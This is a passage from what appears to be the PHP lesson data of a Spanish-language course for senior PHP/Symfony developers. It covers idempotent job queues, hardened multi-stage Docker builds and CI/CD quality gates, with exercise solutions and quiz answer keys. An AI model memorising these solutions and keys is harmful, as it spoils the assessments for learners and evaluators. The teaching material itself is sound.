                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Performance\\Queue;\n\nuse InvalidArgumentException;\nuse Closure;\n\nclass IdempotentJobQueue\n{\n    /**\n     * @var list<array{job_id: string, payload: array<string, mixed>, enqueued_at: float}>\n     */\n    private array \$queue = [];\n\n    /**\n     * @var array<string, bool>\n     */\n    private array \$processed = [];\n\n    public function enqueue(string \$jobId, array \$payload): bool\n    {\n        // TODO: Validar que \$jobId no esté vacío (InvalidArgumentException)\n        // TODO: Si ya está en \$this->processed o en \$this->queue, retornar false (idempotencia)\n        // TODO: Encolar el trabajo con marcas de tiempo y retornar true\n        return false;\n    }\n\n    /**\n     * @return array{job_id: string, result: mixed, processed_at: float}|null\n     */\n    public function processNext(Closure \$processor): ?array\n    {\n        // TODO: Si la cola está vacía, retornar null\n        // TODO: Extraer el primer trabajo en FIFO (array_shift)\n        // TODO: Ejecutar \$processor(\$job['payload'])\n        // TODO: Registrar \$jobId en \$this->processed\n        // TODO: Retornar array estructurado con job_id, result y processed_at\n        return null;\n    }\n\n    public function isProcessed(string \$jobId): bool\n    {\n        return isset(\$this->processed[trim(\$jobId)]);\n    }\n\n    public function clear(): void\n    {\n        \$this->queue = [];\n        \$this->processed = [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Performance\\Queue;\n\nuse InvalidArgumentException;\nuse Closure;\n\nclass IdempotentJobQueue\n{\n    /**\n     * @var list<array{job_id: string, payload: array<string, mixed>, enqueued_at: float}>\n     */\n    private array \$queue = [];\n\n    /**\n     * @var array<string, bool>\n     */\n    private array \$processed = [];\n\n    public function enqueue(string \$jobId, array \$payload): bool\n    {\n        \$cleanId = trim(\$jobId);\n        if (\$cleanId === '') {\n            throw new InvalidArgumentException('El identificador del trabajo no puede estar vacío.');\n        }\n\n        if (\$this->isProcessed(\$cleanId)) {\n            return false;\n        }\n\n        foreach (\$this->queue as \$job) {\n            if (\$job['job_id'] === \$cleanId) {\n                return false;\n            }\n        }\n\n        \$this->queue[] = [\n            'job_id' => \$cleanId,\n            'payload' => \$payload,\n            'enqueued_at' => microtime(true),\n        ];\n\n        return true;\n    }\n\n    /**\n     * @return array{job_id: string, result: mixed, processed_at: float}|null\n     */\n    public function processNext(Closure \$processor): ?array\n    {\n        if (empty(\$this->queue)) {\n            return null;\n        }\n\n        \$job = array_shift(\$this->queue);\n        \$result = \$processor(\$job['payload']);\n\n        \$this->processed[\$job['job_id']] = true;\n\n        return [\n            'job_id' => \$job['job_id'],\n            'result' => \$result,\n            'processed_at' => microtime(true),\n        ];\n    }\n\n    public function isProcessed(string \$jobId): bool\n    {\n        return isset(\$this->processed[trim(\$jobId)]);\n    }\n\n    public function clear(): void\n    {\n        \$this->queue = [];\n        \$this->processed = [];\n    }\n}\n",
                    'explanation' => 'En arquitecturas distribuidas orientadas a mensajes, las redes no son confiables y pueden producirse reentregas o mensajes duplicados. Implementar colas con soporte de idempotencia por ID de trabajo evita ejecuciones redundantes, inconsistencias de estado y cobros duplicados en pasarelas de pago.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Symfony Messenger & Redis Queues',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué en Symfony Messenger se recomienda que los mensajes asíncronos transporten únicamente IDs de dominio (por ejemplo, OrderId) en lugar de la entidad Doctrine completa serializada?',
                            'options' => [
                                'a' => 'Porque PHP 8.4 no permite serializar arrays asociativos.',
                                'b' => 'Para evitar inconsistencias y condiciones de carrera: cuando el worker consuma el mensaje segundos o minutos después, la entidad podría haber cambiado de estado en la base de datos; al recibir solo el ID, el worker consulta el estado más reciente y fresco.',
                                'c' => 'Porque Redis solo admite cadenas de texto de menos de 10 caracteres.',
                                'd' => 'Porque el serializador de Symfony cobra tarifas por byte transferido.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Serializar la entidad congela su estado en el tiempo. Si otro proceso la actualiza antes de que el worker la procese, el worker sobreescribirá los cambios con datos obsoletos. Enviar solo IDs garantiza frescura de datos y mensajes ligeros.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la función del acuse de recibo XACK en Redis Streams dentro del transporte de Symfony Messenger?',
                            'options' => [
                                'a' => 'Borra toda la base de datos de Redis para liberar memoria RAM.',
                                'b' => 'Confirma a Redis que el mensaje fue procesado exitosamente por el consumidor, eliminándolo de la lista de pendientes (Pending Entries List o PEL) y evitando que sea reasignado a otro worker.',
                                'c' => 'Envía una notificación por correo al administrador del sistema.',
                                'd' => 'Cierra la conexión TCP entre Symfony y Redis.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'XACK notifica al stream de Redis que la tarea finalizó con éxito. Si el worker colapsa antes de emitir XACK, el mensaje permanece en la PEL y otro worker puede reclamarlo automáticamente.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es el beneficio de una Dead Letter Queue (DLQ o transporte "failed") en un sistema de mensajería asíncrona?',
                            'options' => [
                                'a' => 'Aumenta la velocidad de CPU de los servidores en un 50%.',
                                'b' => 'Aísla los mensajes que fallaron definitivamente tras agotar todos los reintentos automáticos, permitiendo que la cola principal continúe procesando sin bloqueos y facilitando la depuración e inspección forense.',
                                'c' => 'Oculta los errores al equipo de desarrollo para no generar alarmas.',
                                'd' => 'Elimina permanentemente los mensajes sin dejar rastro.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Un mensaje venenoso (poison pill) bloquearía permanentemente la cola si se reintentara infinitamente. La DLQ aisla el mensaje fallido para análisis y reencolado manual una vez solucionado el bug.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 14: LECCIÓN 1: Docker Multi-stage para PHP-FPM & Nginx
            // ==========================================
            'devops-docker-fpm-nginx' => [
                'slug' => 'devops-docker-fpm-nginx',
                'title' => 'Docker Multi-stage para PHP-FPM & Nginx',
                'module' => 'DevOps & Contenedores',
                'minutes' => 50,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'Contenedorizar una aplicación empresarial en PHP 8.4 y Symfony 8.1 no es simplemente ejecutar FROM php:8.4-fpm e instalar extensiones. Requiere una estrategia de construcción multi-stage (multi-stage build) que separe el entorno de compilación (Composer, Node.js, git, herramientas de desarrollo C) de la imagen de ejecución mínima en producción. Se erradican binarios de desarrollo, se configuran permisos con usuarios sin privilegios (USER www-data o UID/GID 1000:1000) para neutralizar escapes de contenedor, se optimiza el orden de capas de Docker para maximizar el caché de compilación, y se comunican Nginx y PHP-FPM mediante Unix Domain Sockets compartidos a través de un volumen efímero en memoria (tmpfs) para eliminar el overhead de la pila TCP de loopback.',
                    'problem' => 'El antipatrón de la "Imagen Contenedor Monolítica e Insegura": imágenes de 1.8 GB creadas en un solo stage que incluyen gcc, make, git, claves de despliegue SSH, dependencias require-dev de Composer y ejecutan el proceso PHP-FPM como root. Si un atacante descubre una vulnerabilidad de inyección o subida de archivos arbitrarios (RCE), obtiene acceso de superusuario en el contenedor y herramientas de compilación listas para descargar y ejecutar exploits de kernel.',
                    'solution' => 'Estrategia Multi-Stage Hardened para Producción: 1) Stage de dependencias (vendor-builder) con composer install --no-dev --optimize-autoloader; 2) Stage final de ejecución mínima (production-fpm) sin herramientas de compilación, ejecutando como USER www-data; 3) Servidor web Nginx configurado con Unix Domain Sockets (/var/run/php/php-fpm.sock) en un volumen tmpfs en memoria RAM para latencia sub-milisegundo.',
                    'problem_label' => 'El Antipatrón de Imágenes Docker Monolíticas e Inseguras:',
                    'solution_label' => 'La Solución: Docker Multi-Stage Hardened y Sockets Unix en Memoria:',
                ],
                'internals' => [
                    'title' => 'Arquitectura de Contenedores Seguros y Optimización de Capas en Docker',
                    'steps' => [
                        [
                            'phase' => '1. Separación de Compilación y Ejecución (Multi-Stage Builds)',
                            'description' => 'Al compilar dependencias en un stage intermedio desechable y copiar únicamente la carpeta vendor y el código fuente al stage final de producción, se reduce el tamaño de la imagen de 1.8GB a menos de 85MB y se elimina el 90% de vulnerabilidades CVE potenciales.',
                        ],
                        [
                            'phase' => '2. Optimización del Orden de Capas y Caché de Docker',
                            'description' => 'Docker invalida su caché desde la primera instrucción modificada. Copiar composer.json y composer.lock antes del resto del código fuente garantiza que docker build solo reinstale paquetes cuando las dependencias cambian realmente, acelerando los despliegues de 5 minutos a 15 segundos.',
                        ],
                        [
                            'phase' => '3. Comunicación por Unix Domain Sockets vs Loopback TCP',
                            'description' => 'Conectar Nginx con PHP-FPM a través de fastcgi_pass unix:/var/run/php/php-fpm.sock sobre un volumen tmpfs compartido evita la encapsulación y desencapsulación de paquetes TCP en 127.0.0.1:9000, reduciendo el consumo de CPU y la latencia en un 20%.',
                        ],
                        [
                            'phase' => '4. Ejecución Estricta Non-Root y FileSystem de Solo Lectura',
                            'description' => 'La directiva USER www-data impide que cualquier proceso dentro del contenedor tenga privilegios de superusuario en el kernel del host. En Kubernetes, combinar esto con readOnlyRootFilesystem: true y volúmenes montados en /tmp y var/cache neutraliza ataques de persistencia de malware.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/DevOps/Docker/DockerConfigurationValidator.php',
                    'title' => 'Validador de Políticas de Seguridad y Eficiencia para Dockerfiles de Producción',
                    'tag' => 'Docker Hardening & Multi-Stage Validation',
                    'code' => "declare(strict_types=1);

namespace App\DevOps\Docker;

use InvalidArgumentException;
use RuntimeException;

class DockerConfigurationValidator
{
    /**
     * Valida que un Dockerfile cumpla las directivas de seguridad para producción
     *
     * @return array{
     *     is_secure: bool,
     *     stages_found: int,
     *     non_root_user: ?string,
     *     has_no_dev: bool
     * }
     */
    public function validate(string \$dockerfileContent): array
    {
        \$content = trim(\$dockerfileContent);
        if (\$content === '') {
            throw new InvalidArgumentException('El contenido del Dockerfile no puede estar vacío.');
        }

        // 1. Detección de Multi-stage (múltiples cláusulas FROM ... AS ...)
        preg_match_all('/^FROM\\s+[^\\s]+\\s+AS\\s+([^\\s]+)/mi', \$content, \$matches);
        \$stagesCount = count(\$matches[1]);

        if (\$stagesCount < 2) {
            throw new RuntimeException('El Dockerfile debe implementar construcción multi-stage con al menos 2 fases.');
        }

        // 2. Detección de usuario no root
        preg_match('/^USER\\s+([a-zA-Z0-9_-]+)/mi', \$content, \$userMatches);
        \$nonRootUser = \$userMatches[1] ?? null;

        if (\$nonRootUser === null || \$nonRootUser === 'root' || \$nonRootUser === '0') {
            throw new RuntimeException('El Dockerfile de producción debe declarar un usuario no root (ej. USER www-data).');
        }

        // 3. Verificación de dependencias de producción
        \$hasNoDev = str_contains(\$content, '--no-dev');
        if (!\$hasNoDev) {
            throw new RuntimeException('El comando composer install debe incluir la bandera --no-dev en producción.');
        }

        return [
            'is_secure' => true,
            'stages_found' => \$stagesCount,
            'non_root_user' => \$nonRootUser,
            'has_no_dev' => true,
        ];
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, un contenedor Docker no es una máquina virtual ligera, sino un proceso aislado. La regla de oro de la contenedorización de producción: "Menor tamaño, cero herramientas de desarrollo, usuario sin privilegios y capas inmutables". Si una imagen de PHP contiene git, gcc o corre como root, no está lista para producción. Un Senior diseña contenedores efímeros y sin estado donde el ciclo de vida es descartable en cualquier milisegundo.',
                    'critical_questions' => [
                        '¿Está el contenedor ejecutándose con USER www-data en lugar de root?',
                        '¿Nuestra imagen final de producción contiene herramientas de compilación como gcc, make o git?',
                        '¿Estamos copiando composer.json y composer.lock antes del código de dominio para aprovechar la caché de capas de Docker?',
                        '¿Se comunican Nginx y PHP-FPM a través de Unix Domain Sockets en un volumen tmpfs o sobre la pila TCP?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Crear la imagen de contenedor para desplegar una API Symfony en Kubernetes.',
                    'junior' => [
                        'approach' => 'Crea un Dockerfile con FROM php:8.4, instala git, curl, zip, corre composer install sin banderas, y arranca el contenedor como root exponiendo el puerto 8000 con el servidor interno de PHP.',
                        'flaws' => [
                            'Imagen masiva de 1.5GB con descarga lenta en nodos de clúster de Kubernetes.',
                            'Vulnerabilidad crítica si hay RCE: el atacante tiene permisos de root en el host y git/curl para descargar payloads.',
                            'Dependencias de desarrollo (PHPUnit, Faker) instaladas en producción.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Diseña una construcción multi-stage: stage 1 para compilar vendor con --no-dev --optimize-autoloader; stage 2 con Alpine minimalista (< 80MB), USER www-data, OpCache Preloading compilado y socket Unix para Nginx.',
                        'rationale' => [
                            'Imagen ultraligera de 75MB que escala horizontalmente en segundos.',
                            'Superficie de ataque reducida a cero: no existen binarios de shell innecesarios ni herramientas C.',
                            'Seguridad reforzada por diseño: contenedor non-root inmune a escapes de privilegios estándar.',
                        ],
                        'trade_offs' => 'Requiere mantener Dockerfiles con múltiples etapas y volumen compartido para socket Unix si se orquestan en pods separados.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de DockerManifestValidator',
                    'objective' => 'Implementar la clase DockerManifestValidator que verifique que el contenido de un Dockerfile cumpla las reglas de seguridad: construcción multi-stage (mínimo 2 fases con AS), ejecución con usuario no-root (USER diferente de root/0) y presencia de la bandera --no-dev en las dependencias.',
                    'instructions' => 'Completa DockerManifestValidator: implementa validateDockerfile(string $dockerfileContent): array. Valida que el contenido (tras trim) no sea vacío (InvalidArgumentException). Comprueba que tenga al menos dos fases multi-stage buscando cláusulas FROM ... AS ... (de lo contrario lanza RuntimeException). Comprueba que contenga la directiva USER y que el usuario no sea "root" ni "0" (de lo contrario lanza RuntimeException). Comprueba que contenga la bandera "--no-dev" (de lo contrario lanza RuntimeException). Retorna array con: valid => true, stages_count (int), non_root_user (string). Implementa reset(): void.',
                    'filename' => 'DockerManifestValidator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\DevOps\\Docker;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass DockerManifestValidator\n{\n    public function validateDockerfile(string \$dockerfileContent): array\n    {\n        // TODO: Validar que \$dockerfileContent (tras trim) no sea vacío (InvalidArgumentException)\n        // TODO: Verificar multi-stage: al menos 2 cláusulas FROM ... AS ... (RuntimeException si no)\n        // TODO: Verificar directiva USER no-root (RuntimeException si falta o es root/0)\n        // TODO: Verificar presencia de bandera '--no-dev' (RuntimeException si falta)\n        // TODO: Retornar array estructurado con valid, stages_count y non_root_user\n        return [];\n    }\n\n    public function reset(): void\n    {\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\DevOps\\Docker;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass DockerManifestValidator\n{\n    public function validateDockerfile(string \$dockerfileContent): array\n    {\n        \$content = trim(\$dockerfileContent);\n        if (\$content === '') {\n            throw new InvalidArgumentException('El contenido del manifiesto no puede estar vacío.');\n        }\n\n        // Detección de etapas multi-stage (FROM ... AS ...)\n        preg_match_all('/^FROM\\s+[^\\s]+\\s+AS\\s+([^\\s]+)/mi', \$content, \$matches);\n        \$stagesCount = count(\$matches[1]);\n\n        if (\$stagesCount < 2) {\n            throw new RuntimeException('El Dockerfile debe implementar construcción multi-stage con al menos 2 fases.');\n        }\n\n        // Detección de directiva USER no-root\n        preg_match('/^USER\\s+([a-zA-Z0-9_-]+)/mi', \$content, \$userMatches);\n        \$user = \$userMatches[1] ?? null;\n\n        if (\$user === null || \$user === 'root' || \$user === '0') {\n            throw new RuntimeException('El Dockerfile de producción debe declarar un usuario no root (ej. USER www-data).');\n        }\n\n        // Verificación de bandera --no-dev\n        if (!str_contains(\$content, '--no-dev')) {\n            throw new RuntimeException('El manifiesto debe incluir la bandera --no-dev para dependencias de producción.');\n        }\n\n        return [\n            'valid' => true,\n            'stages_count' => \$stagesCount,\n            'non_root_user' => \$user,\n        ];\n    }\n\n    public function reset(): void\n    {\n    }\n}\n",
                    'explanation' => 'Un Dockerfile seguro para producción debe erradicar dependencias de desarrollo y herramientas de compilación mediante multi-stage builds, e impedir que los procesos corran como superusuario mediante la directiva USER www-data, blindando la infraestructura ante potenciales vulnerabilidades en el contenedor.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Docker Multi-Stage & Seguridad en Contenedores',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es el beneficio primordial de utilizar construcciones Multi-Stage en Docker para aplicaciones PHP en producción?',
                            'options' => [
                                'a' => 'Permite que el contenedor funcione sin conexión a Internet.',
                                'b' => 'Separa el entorno de compilación (Composer, git, dependencias dev) de la imagen final de ejecución, generando una imagen ligera sin herramientas C ni vectores de ataque innecesarios.',
                                'c' => 'Hace que PHP compile directamente a código ensamblador de tarjeta gráfica.',
                                'd' => 'Elimina la necesidad de usar un servidor web como Nginx.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Al aislar herramientas pesadas de compilación en stages descartables, la imagen final contiene solo los artefactos necesarios para la ejecución, reduciendo la superficie de ataque (CVEs) y el tiempo de transferencia en red.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué en producción se debe ejecutar el contenedor de PHP-FPM con un usuario no privilegiado (como `USER www-data`) en lugar de `root`?',
                            'options' => [
                                'a' => 'Porque el usuario root no puede conectarse a MySQL.',
                                'b' => 'Para mitigar el impacto de un escape de contenedor: si un atacante logra ejecución remota de código (RCE), sus privilegios estarán confinados a un usuario sin permisos de administración en el kernel del host.',
                                'c' => 'Porque Docker cobra tarifas más altas cuando se ejecuta como root.',
                                'd' => 'Porque PHP 8.4 no admite el usuario root.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Ejecutar procesos como root en contenedores debilita la barrera de aislamiento del kernel. Un usuario sin privilegios como www-data impide modificaciones al sistema de archivos raíz y dificulta escaladas de privilegios.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué la comunicación entre Nginx y PHP-FPM mediante Unix Domain Sockets en un volumen en memoria (tmpfs) es superior a la conexión TCP (127.0.0.1:9000)?',
                            'options' => [
                                'a' => 'Porque los Unix Domain Sockets eliminan la sobrecarga de la pila de red TCP (tres vías de enlace, cálculo de checksums y buffers de loopback), ofreciendo menor latencia y menor uso de CPU.',
                                'b' => 'Porque TCP ya no funciona en servidores Linux modernos.',
                                'c' => 'Porque los sockets Unix son compatibles con navegadores antiguos.',
                                'd' => 'Porque los sockets Unix cifran el tráfico con clave cuántica.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Los sockets Unix operan directamente en memoria del kernel sin pasar por el stack de protocolos TCP/IP, proporcionando un throughput hasta 20% más rápido para comunicaciones en el mismo host o pod.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 14: LECCIÓN 2: CI/CD Pipeline con PHPStan & PHPUnit
            // ==========================================
            'devops-ci-cd-github-actions' => [
                'slug' => 'devops-ci-cd-github-actions',
                'title' => 'CI/CD Pipeline con PHPStan & PHPUnit',
                'module' => 'DevOps & Contenedores',
                'minutes' => 45,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'La Integración y Despliegue Continuo (CI/CD) es la columna vertebral de la ingeniería de software moderna. En un entorno profesional con PHP 8.4 y Symfony 8.1, un pipeline de GitHub Actions no es un script informal, sino una puerta de calidad (Quality Gate) determinista e intransigente. Se articulan cuatro barreras de control antes de permitir cualquier merge: 1) Verificación sintáctica y estándares de codificación con PHP-CS-Fixer / PHP_CodeSniffer; 2) Análisis estático de tipo máximo con PHPStan Nivel 9 o Larastan/PHPStan Symfony Extension; 3) Pruebas automatizadas unitarias y funcionales con PHPUnit y medición de cobertura de código; 4) Detección de vulnerabilidades en dependencias mediante Composer Audit y Trivy.',
                    'problem' => 'El antipatrón del "Despliegue Manual y Fe Ciega": equipos que despliegan código a producción subiendo archivos vía FTP/SSH o ejecutando git pull directamente en el servidor sin validar tipos, romper ramas si los tests fallan o comprobar vulnerabilidades de seguridad en librerías de terceros. Los bugs de tipado se descubren en producción con usuarios reales sufriendo errores 500 fatales.',
                    'solution' => 'Pipeline Automatizado de 4 Fases con GitHub Actions: 1) Job de Linting & Codestyle en paralelo (< 30s); 2) Job de Análisis Estático (PHPStan Nivel 9) que detecta tipos null no manejados y firmas incompatibles; 3) Job de Testing con PHPUnit y contenedores de servicios efímeros (MySQL 8.0 y Redis); 4) Job de Auditoría de Seguridad con composer audit para bloquear dependencias con CVEs activas.',
                    'problem_label' => 'El Antipatrón de Despliegues Manuales sin Quality Gates:',
                    'solution_label' => 'La Solución: CI/CD Pipeline Automatizado con PHPStan Nivel 9 y PHPUnit:',
                ],
                'internals' => [
                    'title' => 'Estructura de un Pipeline de Integración Continua de Grado Enterprise',
                    'steps' => [
                        [
                            'phase' => '1. Caché de Dependencias Composer y Ejecución Paralela',
                            'description' => 'El uso de actions/cache con hash de composer.lock restaura la carpeta vendor en segundos en lugar de reinstalarla en cada commit, reduciendo drásticamente el tiempo de ejecución del pipeline en GitHub Actions.',
                        ],
                        [
                            'phase' => '2. Análisis Estático Riguroso con PHPStan Nivel 9',
                            'description' => 'PHPStan Nivel 9 exige tipado estricto absoluto: prohíbe el uso de tipos mixed implícitos, obliga a verificar valores nulos antes de acceder a métodos y propiedades, y detecta llamadas a métodos inexistentes sin ejecutar el código.',
                        ],
                        [
                            'phase' => '3. Contenedores de Servicios Efímeros para Pruebas de Integración',
                            'description' => 'GitHub Actions permite levantar contenedores de servicios (services: mysql: image: mysql:8.0) en la misma red que el runner, permitiendo que PHPUnit ejecute migraciones de Doctrine y consultas reales sin depender de mocks frágiles.',
                        ],
                        [
                            'phase' => '4. Despliegue Atómico Zero-Downtime y Recarga Suave',
                            'description' => 'Un despliegue sin caída conmuta un enlace simbólico (current -> releases/xxx) y envía la señal USR2 al proceso maestro de PHP-FPM (kill -USR2 1). Los procesos activos completan las peticiones en curso mientras los nuevos workers cargan el código actualizado.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/DevOps/CiCd/CiPipelineReportGenerator.php',
                    'title' => 'Agregador de Métricas de Calidad de CI/CD con Evaluación de Quality Gates',
                    'tag' => 'CI/CD Quality Gate & Metrics Aggregator',
                    'code' => "declare(strict_types=1);

namespace App\DevOps\CiCd;

use RuntimeException;

class CiPipelineReportGenerator
{
    /**
     * @param array<string, mixed> \$phpstanOutput
     * @param array<string, mixed> \$phpunitOutput
     * @return array{
     *     quality_gate_passed: bool,
     *     phpstan_errors: int,
     *     tests_passed: int,
     *     coverage_percentage: float,
     *     summary: string
     * }
     */
    public function evaluateQualityGate(array \$phpstanOutput, array \$phpunitOutput, float \$minCoverage = 80.0): array
    {
        \$phpstanErrors = (int) (\$phpstanOutput['total_errors'] ?? 0);
        \$testsPassed = (int) (\$phpunitOutput['passed_tests'] ?? 0);
        \$testsFailed = (int) (\$phpunitOutput['failed_tests'] ?? 0);
        \$coverage = (float) (\$phpunitOutput['code_coverage'] ?? 0.0);

        \$isStaticAnalysisClean = \$phpstanErrors === 0;
        \$areTestsGreen = \$testsFailed === 0;
        \$isCoverageSufficient = \$coverage >= \$minCoverage;

        \$passed = \$isStaticAnalysisClean && \$areTestsGreen && \$isCoverageSufficient;

        \$summary = sprintf(
            'CI Pipeline: PHPStan errores=%d | Tests pasados=%d, fallidos=%d | Cobertura=%.1f%% (Min: %.1f%%)',
            \$phpstanErrors,
            \$testsPassed,
            \$testsFailed,
            \$coverage,
            \$minCoverage
        );

        return [
            'quality_gate_passed' => \$passed,
            'phpstan_errors' => \$phpstanErrors,
            'tests_passed' => \$testsPassed,
            'coverage_percentage' => \$coverage,
            'summary' => \$summary,
        ];
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, el pipeline de CI/CD es la fuente de verdad definitiva del repositorio. Si el pipeline falla, el código está objetivamente roto, sin importar si "en mi máquina local funciona". Un Senior configura el análisis estático en el nivel más estricto posible (PHPStan Level 9) porque sabe que prevenir un bug en CI cuesta 100 veces menos que solucionarlo tras una caída en producción.',
                    'critical_questions' => [
                        '¿Tiene nuestro pipeline configurado PHPStan en Nivel 8 o 9 con extensiones de Symfony y Doctrine activas?',
                        '¿Estamos usando actions/cache con hash de composer.lock para evitar descargas redundantes?',
                        '¿Se ejecutan las pruebas funcionales contra una base de datos MySQL real en un contenedor de servicio efímero?',
                        '¿Existe un paso de auditoría con composer audit para bloquear dependencias vulnerables antes de llegar a producción?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Configurar la integración continua para validar Pull Requests de un equipo de 8 desarrolladores.',
                    'junior' => [
                        'approach' => 'Crea un workflow de GitHub Actions que solo corre phpunit sin base de datos, ignora los errores de estilo y desactiva el pipeline si tarda más de 5 minutos.',
                        'flaws' => [
                            'Falsos positivos: los tests pasan en memoria pero fallan en producción por incompatibilidades de SQL.',
                            'Errores de tipado escapan a producción porque no existe análisis estático.',
                            'No se verifica la seguridad de las librerías de Composer.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Diseña una matriz paralela de GitHub Actions: Job 1 valida codestyle y composer validate; Job 2 ejecuta PHPStan Nivel 9; Job 3 ejecuta PHPUnit con service container de MySQL 8.0 y Redis; Job 4 ejecuta composer audit. Todos los jobs deben pasar para autorizar el merge.',
                        'rationale' => [
                            'Calidad determinista: ningún código con errores de tipo o pruebas rotas puede ser integrado.',
                            'Ejecución en menos de 90 segundos gracias al paralelismo y caché de dependencias.',
                            'Defensa preventiva contra vulnerabilidades de terceros en composer.lock.',
                        ],
                        'trade_offs' => 'Requiere disciplina en el equipo para mantener el código estrictamente tipado según las reglas de PHPStan Nivel 9.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de CiPipelineRunner',
                    'objective' => 'Implementar la clase CiPipelineRunner para orquestar la ejecución secuencial de pasos de validación en un pipeline de CI/CD con estrategia fail-fast, captura de excepciones y reporte estructurado de estado.',
                    'instructions' => 'Completa CiPipelineRunner: implementa addStep(string $name, Closure $check): void. Valida que $name (tras trim) no sea vacío (InvalidArgumentException). Guarda el paso en la cola interna. Implementa run(): array: ejecuta los pasos registrados en orden secuencial; si un paso retorna false o lanza una excepción (Throwable), detiene la ejecución inmediatamente (fail-fast), registra el paso fallido, captura el mensaje de error y retorna array con: passed => false, total_steps, executed_steps, failed_step, error. Si todos los pasos se ejecutan exitosamente retornando true, retorna array con: passed => true, total_steps, executed_steps, failed_step => null, error => null. Implementa reset(): void para limpiar los pasos registrados.',
                    'filename' => 'CiPipelineRunner.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\DevOps\\CiCd;\n\nuse InvalidArgumentException;\nuse Closure;\nuse Throwable;\n\nclass CiPipelineRunner\n{\n    /**\n     * @var list<array{name: string, check: Closure}>\n     */\n    private array \$steps = [];\n\n    public function addStep(string \$name, Closure \$check): void\n    {\n        // TODO: Validar que \$name (tras trim) no sea vacío (InvalidArgumentException)\n        // TODO: Almacenar en \$this->steps\n    }\n\n    /**\n     * @return array{passed: bool, total_steps: int, executed_steps: int, failed_step: ?string, error: ?string}\n     */\n    public function run(): array\n    {\n        // TODO: Ejecutar pasos secuencialmente\n        // TODO: Si un paso retorna false o lanza Throwable, detener (fail-fast) y retornar passed => false con detalle\n        // TODO: Si todos retornan true, retornar passed => true\n        return [\n            'passed' => false,\n            'total_steps' => 0,\n            'executed_steps' => 0,\n            'failed_step' => null,\n            'error' => null,\n        ];\n    }\n\n    public function reset(): void\n    {\n        \$this->steps = [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\DevOps\\CiCd;\n\nuse InvalidArgumentException;\nuse Closure;\nuse Throwable;\n\nclass CiPipelineRunner\n{\n    /**\n     * @var list<array{name: string, check: Closure}>\n     */\n    private array \$steps = [];\n\n    public function addStep(string \$name, Closure \$check): void\n    {\n        \$cleanName = trim(\$name);\n        if (\$cleanName === '') {\n            throw new InvalidArgumentException('El nombre del paso no puede estar vacío.');\n        }\n\n        \$this->steps[] = [\n            'name' => \$cleanName,\n            'check' => \$check,\n        ];\n    }\n\n    /**\n     * @return array{passed: bool, total_steps: int, executed_steps: int, failed_step: ?string, error: ?string}\n     */\n    public function run(): array\n    {\n        \$totalSteps = count(\$this->steps);\n        \$executedSteps = 0;\n\n        foreach (\$this->steps as \$step) {\n            \$executedSteps++;\n            try {\n                \$check = \$step['check'];\n                \$result = \$check();\n\n                if (\$result === false) {\n                    return [\n                        'passed' => false,\n                        'total_steps' => \$totalSteps,\n                        'executed_steps' => \$executedSteps,\n                        'failed_step' => \$step['name'],\n                        'error' => sprintf('El paso \"%s\" falló su validación.', \$step['name']),\n                    ];\n                }\n            } catch (Throwable \$e) {\n                return [\n                    'passed' => false,\n                    'total_steps' => \$totalSteps,\n                    'executed_steps' => \$executedSteps,\n                    'failed_step' => \$step['name'],\n                    'error' => \$e->getMessage(),\n                ];\n            }\n        }\n\n        return [\n            'passed' => true,\n            'total_steps' => \$totalSteps,\n            'executed_steps' => \$executedSteps,\n            'failed_step' => null,\n            'error' => null,\n        ];\n    }\n\n    public function reset(): void\n    {\n        \$this->steps = [];\n    }\n}\n",
                    'explanation' => 'Un ejecutor de pipeline de CI/CD implementa el principio de fail-fast: detiene la ejecución inmediatamente ante el primer error para evitar desperdicio de ciclos de computación en la nube y reporta con precisión milimétrica qué verificación provocó el fallo.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: CI/CD con PHPStan & PHPUnit en GitHub Actions',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué exigencia clave introduce el Nivel 9 de PHPStan frente a niveles inferiores como el Nivel 5?',
                            'options' => [
                                'a' => 'Exige que todas las funciones tengan menos de 5 líneas.',
